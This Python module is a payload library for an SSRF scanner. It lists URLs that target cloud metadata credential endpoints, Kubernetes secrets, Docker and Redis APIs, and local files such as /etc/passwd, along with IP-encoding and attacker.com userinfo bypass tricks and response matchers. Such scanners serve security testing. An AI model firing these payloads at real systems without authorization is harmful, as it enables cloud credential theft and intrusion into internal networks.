"""ssrf payload library — generated dev-time by Claude.

Each entry is a fully-formed SSRF target URL plus a regex marker that proves
the response came from inside the target's network (cloud-metadata endpoint
content, localhost banners, internal-only headers). The scanner injects the
URL into common keys (url=, src=, fetch=, etc) and looks for the marker in
the response body.

Categories:
  - aws-imds       : AWS IMDSv1/IMDSv2 instance metadata (HIGH cloud-cred risk)
  - gcp-metadata   : Google Cloud metadata server
  - azure-imds     : Azure Instance Metadata Service
  - do-metadata    : DigitalOcean droplet metadata
  - oracle-imds    : Oracle Cloud Infrastructure metadata
  - alibaba-imds   : Alibaba ECS metadata
  - tencent-imds   : Tencent Cloud CVM metadata
  - ibm-imds       : IBM Cloud metadata
  - kubelet        : Kubernetes kubelet / etcd internal
  - docker-api     : Docker daemon socket exposed via HTTP
  - localhost      : 127.0.0.1, ::1, 0.0.0.0 reachability
  - internal-net   : RFC-1918 private ranges (10/8, 172.16/12, 192.168/16)
  - schema-bypass  : gopher://, file://, dict://, ldap://, jar://
  - dns-rebind     : Hostnames that resolve to internal IPs (smart filter)
"""

SSRF_PAYLOADS = [
  # ── AWS IMDSv1 (the classic Capital-One breach) ──
  {"url": "http://169.254.169.254/latest/meta-data/", "matcher": r"ami-id|instance-id|local-ipv4|public-keys|security-credentials", "category": "aws-imds", "name": "AWS IMDS root", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "matcher": r"AccessKeyId|SecretAccessKey|Token|Expiration", "category": "aws-imds", "name": "AWS IAM credentials", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/latest/user-data/", "matcher": r"#!/bin/|cloud-init|^\s*[A-Z_]+=", "category": "aws-imds", "name": "AWS user-data (boot script)", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://169.254.169.254/latest/meta-data/iam/info", "matcher": r"InstanceProfileArn|LastUpdated|InstanceProfileId", "category": "aws-imds", "name": "AWS IAM info", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://169.254.169.254/latest/dynamic/instance-identity/document", "matcher": r"accountId|imageId|availabilityZone", "category": "aws-imds", "name": "AWS instance identity doc", "severity": "MEDIUM", "cvss": 6.5},

  # ── AWS IMDS — bypass tricks (DNS-style / decimal / octal) ──
  {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS IPv6 mapped", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://2852039166/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS decimal IP", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://0251.0376.0251.0376/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS octal IP", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254.nip.io/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS nip.io wildcard DNS", "severity": "CRITICAL", "cvss": 9.8},

  # ── GCP metadata ──
  {"url": "http://metadata.google.internal/computeMetadata/v1/", "matcher": r"instance/|project/|service-accounts", "category": "gcp-metadata", "name": "GCP metadata root", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", "matcher": r"access_token|expires_in|token_type", "category": "gcp-metadata", "name": "GCP SA token", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://metadata.google.internal/computeMetadata/v1/project/project-id", "matcher": r"^[a-z0-9-]{6,30}$", "category": "gcp-metadata", "name": "GCP project ID", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://169.254.169.254/computeMetadata/v1/", "matcher": r"instance/|project/|service-accounts", "category": "gcp-metadata", "name": "GCP via 169.254 IP", "severity": "CRITICAL", "cvss": 9.8},

  # ── Azure IMDS ──
  {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "matcher": r"compute|networkInterface|vmId", "category": "azure-imds", "name": "Azure IMDS instance", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", "matcher": r"access_token|expires_in|client_id", "category": "azure-imds", "name": "Azure managed-identity token", "severity": "CRITICAL", "cvss": 9.8},

  # ── DigitalOcean ──
  {"url": "http://169.254.169.254/metadata/v1/", "matcher": r"droplet_id|interfaces|hostname|user-data", "category": "do-metadata", "name": "DigitalOcean metadata", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254/metadata/v1/user-data", "matcher": r"#!/bin/|cloud-init", "category": "do-metadata", "name": "DigitalOcean user-data", "severity": "HIGH", "cvss": 8.1},

  # ── Oracle Cloud ──
  {"url": "http://169.254.169.254/opc/v2/instance/", "matcher": r"availabilityDomain|compartmentId|displayName", "category": "oracle-imds", "name": "Oracle Cloud instance", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://169.254.169.254/opc/v2/identity/", "matcher": r"compartmentId|tenancyId|userId", "category": "oracle-imds", "name": "Oracle Cloud identity", "severity": "CRITICAL", "cvss": 9.1},

  # ── Alibaba ECS ──
  {"url": "http://100.100.100.200/latest/meta-data/", "matcher": r"image-id|instance-id|region-id|hostname", "category": "alibaba-imds", "name": "Alibaba ECS metadata", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "matcher": r"AccessKeyId|AccessKeySecret|SecurityToken", "category": "alibaba-imds", "name": "Alibaba RAM credentials", "severity": "CRITICAL", "cvss": 9.8},

  # ── Tencent Cloud ──
  {"url": "http://metadata.tencentyun.com/latest/meta-data/", "matcher": r"instance-id|local-ipv4|region", "category": "tencent-imds", "name": "Tencent CVM metadata", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/", "matcher": r"TmpSecretId|TmpSecretKey|Token", "category": "tencent-imds", "name": "Tencent CAM credentials", "severity": "CRITICAL", "cvss": 9.8},

  # ── IBM Cloud ──
  {"url": "http://169.254.169.254/metadata/v1/instance", "matcher": r"vpc_id|profile|crn", "category": "ibm-imds", "name": "IBM Cloud instance", "severity": "HIGH", "cvss": 7.5},

  # ── Kubernetes / container orchestration ──
  {"url": "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets", "matcher": r'"kind":\s*"Secret"|service-account-token', "category": "kubelet", "name": "K8s API secrets", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:10250/pods/", "matcher": r'"kind":\s*"PodList"|namespace', "category": "kubelet", "name": "Kubelet read-only API", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:2379/v2/keys/", "matcher": r'"action":|"node":\s*\{', "category": "kubelet", "name": "etcd v2 keys", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:2379/version", "matcher": r'"etcdserver"|"etcdcluster"', "category": "kubelet", "name": "etcd version", "severity": "HIGH", "cvss": 7.5},

  # ── Docker daemon socket exposed over TCP ──
  {"url": "http://localhost:2375/version", "matcher": r"\"ApiVersion\"|\"Version\":\"\\d", "category": "docker-api", "name": "Docker daemon 2375", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:2375/containers/json", "matcher": r"\"Id\":\"[a-f0-9]+\"|\"Image\"", "category": "docker-api", "name": "Docker container list", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://localhost:4243/version", "matcher": r"\"ApiVersion\"|\"Version\":\"\\d", "category": "docker-api", "name": "Docker daemon 4243", "severity": "CRITICAL", "cvss": 9.8},

  # ── Localhost reachability ──
  {"url": "http://localhost/", "matcher": r"<html|<title|<body|nginx|apache", "category": "localhost", "name": "localhost root", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://127.0.0.1/", "matcher": r"<html|<title|<body|nginx|apache", "category": "localhost", "name": "127.0.0.1 root", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://[::1]/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "IPv6 ::1", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://0.0.0.0/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "0.0.0.0 binding", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://127.1/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "Short-form 127.1", "severity": "MEDIUM", "cvss": 5.3},

  # ── Common internal services on localhost ──
  {"url": "http://localhost:6379/", "matcher": r"-ERR wrong number|PONG", "category": "localhost", "name": "Redis on 6379", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "http://localhost:11211/", "matcher": r"VERSION|ERROR", "category": "localhost", "name": "Memcached on 11211", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:9200/", "matcher": r"\"cluster_name\"|\"version\"|elasticsearch", "category": "localhost", "name": "Elasticsearch on 9200", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:9300/", "matcher": r"\"cluster_name\"|\"version\"", "category": "localhost", "name": "Elasticsearch transport 9300", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "http://localhost:8080/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "Common app 8080", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://localhost:8000/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "Common dev 8000", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://localhost:5432/", "matcher": r"FATAL|password", "category": "localhost", "name": "Postgres on 5432", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:3306/", "matcher": r"mysql|MariaDB|HOSTNAME", "category": "localhost", "name": "MySQL on 3306", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:27017/", "matcher": r"It looks like you are trying to access MongoDB", "category": "localhost", "name": "MongoDB on 27017", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:5601/", "matcher": r"Kibana|kbn-name", "category": "localhost", "name": "Kibana on 5601", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "http://localhost:8500/v1/agent/self", "matcher": r"\"Config\":|consul", "category": "localhost", "name": "Consul agent 8500", "severity": "HIGH", "cvss": 7.5},
  {"url": "http://localhost:4646/v1/agent/self", "matcher": r"\"nomad\":|\"member\"", "category": "localhost", "name": "Nomad agent 4646", "severity": "HIGH", "cvss": 7.5},

  # ── RFC-1918 internal ranges ──
  {"url": "http://10.0.0.1/", "matcher": r"<html|<title|router|admin", "category": "internal-net", "name": "10.0.0.1 gateway", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://172.17.0.1/", "matcher": r"<html|<title|router|admin", "category": "internal-net", "name": "Docker host 172.17.0.1", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://192.168.0.1/", "matcher": r"<html|<title|router|admin", "category": "internal-net", "name": "192.168.0.1 router", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://192.168.1.1/", "matcher": r"<html|<title|router|admin", "category": "internal-net", "name": "192.168.1.1 router", "severity": "MEDIUM", "cvss": 5.3},

  # ── Schema bypass (file://, gopher://, etc) ──
  {"url": "file:///etc/passwd", "matcher": r"root:.*:0:0", "category": "schema-bypass", "name": "file:// /etc/passwd", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "file:///etc/hosts", "matcher": r"localhost|127\.0\.0\.1", "category": "schema-bypass", "name": "file:// /etc/hosts", "severity": "HIGH", "cvss": 7.5},
  {"url": "file:///proc/self/environ", "matcher": r"PATH=|HOME=|USER=", "category": "schema-bypass", "name": "file:// proc env", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "file:///c:/windows/win.ini", "matcher": r"\[fonts\]|\[extensions\]", "category": "schema-bypass", "name": "file:// Windows win.ini", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "dict://localhost:6379/info", "matcher": r"redis_version|connected_clients", "category": "schema-bypass", "name": "dict:// Redis info", "severity": "HIGH", "cvss": 7.5},
  {"url": "gopher://localhost:6379/_INFO", "matcher": r"redis_version", "category": "schema-bypass", "name": "gopher:// Redis", "severity": "CRITICAL", "cvss": 9.1},
  {"url": "ldap://localhost:389/", "matcher": r"matchedDN|objectClass", "category": "schema-bypass", "name": "ldap:// internal", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "jar:http://localhost/!/index.html", "matcher": r"<html|<title", "category": "schema-bypass", "name": "jar:http:// nested", "severity": "MEDIUM", "cvss": 5.3},

  # ── DNS-rebind smart targets (resolve to internal IPs) ──
  {"url": "http://localtest.me/", "matcher": r"<html|<title|<body", "category": "dns-rebind", "name": "localtest.me → 127.0.0.1", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "http://127.0.0.1.nip.io/", "matcher": r"<html|<title|<body", "category": "dns-rebind", "name": "nip.io wildcard → loopback", "severity": "MEDIUM", "cvss": 6.5},
  {"url": "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/", "matcher": r"<html|<title|<body", "category": "dns-rebind", "name": "Subdomain trick → loopback", "severity": "MEDIUM", "cvss": 6.5},

  # ── Trailing-newline / fragment confusion ──
  {"url": "http://169.254.169.254%23.attacker.com/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS fragment bypass", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://169.254.169.254%2F.attacker.com/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS slash bypass", "severity": "CRITICAL", "cvss": 9.8},
  {"url": "http://attacker.com@169.254.169.254/latest/meta-data/", "matcher": r"ami-id|instance-id", "category": "aws-imds", "name": "AWS IMDS userinfo bypass", "severity": "CRITICAL", "cvss": 9.8},

  # ── HTTPS variants (some SSRF servers proxy https only) ──
  {"url": "https://169.254.169.254/latest/meta-data/", "matcher": r"ami-id|instance-id|local-ipv4", "category": "aws-imds", "name": "AWS IMDS over HTTPS", "severity": "CRITICAL", "cvss": 9.8},

  # ── Loopback name aliases ──
  {"url": "http://0/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "Short-form 0 = 0.0.0.0", "severity": "MEDIUM", "cvss": 5.3},
  {"url": "http://2130706433/", "matcher": r"<html|<title|<body", "category": "localhost", "name": "Decimal 127.0.0.1", "severity": "MEDIUM", "cvss": 5.3},
]
